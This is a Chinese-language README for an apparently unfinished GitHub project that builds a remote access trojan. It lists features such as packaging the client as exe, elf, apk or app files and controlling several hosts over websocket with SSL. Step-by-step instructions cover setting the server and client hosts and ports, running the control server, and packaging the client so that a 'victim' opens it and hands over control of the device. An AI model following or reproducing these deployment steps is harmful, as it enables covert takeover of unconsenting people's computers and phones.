# remote_access_trojan

语言：[中文](README.md) [English](README_en.md)

这个仓库用于生成木马病毒，目前暂未做好

注：用户使用该软件造成的任何损失和赔偿，全由用户承担

## 特点：
- 木马病毒可打包成exe,elf,apk,app可执行文件 ✅
- 木马病毒支持中文和英文 ✅
- 木马病毒基于wss(websocket+ssl)协议，原计划基于tcp协议 ✅
- 木马病毒可以通过命令行，网页，图形化这些方式控制目标主机 → 木马病毒可以通过命令行，网页这些方式控制目标主机 ✅
- 木马病毒可以同时控制多台设备 ✅
- 木马病毒可以对目标主机输入命令，获取系统信息，上传/下载文件，截图，录音，实时观看对方屏幕，截取键盘输入等操作 ❌

## 准备环境：
跳转至[https://github.com/zhaobokai341/RATFF/wiki/%E5%87%86%E5%A4%87%E7%8E%AF%E5%A2%83](https://github.com/zhaobokai341/RATFF/wiki/%E5%87%86%E5%A4%87%E7%8E%AF%E5%A2%83)

## 如何使用：
### 下载
方法1：克隆这个仓库并进入该目录
```bash
git clone https://github.com/zhaobokai341/remote_access_trojan.git
cd remote_access_trojan
```
方法2：直接通过浏览器下载压缩包然后解压，且进入该目录
方法3：进入[Releases](https://github.com/zhaobokai341/remote_access_trojan/releases),选择合适的版本，下载名为code.zip的文件并解压，且进入该目录

### 配置
进入code目录，有两个文件夹（zh,en），zh是中文版本，en是英文版本，选择合适的文件夹即可，这里以zh为例

进入zh文件夹， 打开server.py文件，找到与它类似的代码
```python
HOST = '0.0.0.0' 
PORT = 8765
SSL_CERT = '../cert.pem' 
SSL_KEY = '../key.pem'
```
配置HOST和PORT，HOST要连接的主机，PORT是端口，保持默认即可

配置SSL_CERT和SSL_KEY，改成你生成的证书密钥路径

接着打开client.py文件，找到与它类似的代码
```python
HOST = '127.0.0.1' 
PORT = 8765
```
HOST修改成服务端IP，PORT与服务器设置的PORT相同

### 运行
在同级目录下，打开command,输入：
```bash
python server.py
```
这将启动服务器，他用于控制所有受害者的设备。

而client.py是客户端，你可以自行打包成可执行文件，然后让受害者打开，如果配置正确，你将能随意控制他的设备。
